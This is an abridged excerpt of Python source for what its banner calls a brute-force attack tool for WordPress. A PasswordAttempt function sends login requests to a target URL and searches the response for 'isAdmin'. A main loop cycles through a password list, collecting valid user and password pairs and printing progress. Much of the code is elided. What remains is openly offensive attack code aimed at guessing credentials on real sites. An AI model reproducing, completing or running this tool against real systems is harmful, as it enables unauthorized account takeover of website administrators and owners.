    ...
    banner = """\
     ...
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
        ...
        /  \-'~;   ||__/|-"   Brute Force Attack Tool for Wordpress
...
def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
    ...
    try:
        req = urllib2.Request(url, post.encode(), headers)
        response = urllib2.urlopen(req, timeout=3)
        the_page = response.read()
        look_for = "isAdmin"
        try:
            splitter = the_page.split(look_for.encode(), 1)[1]
...
def main():
    ...
    while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
        ...
        print(" " + percent + " Percent Complete\r", end='')
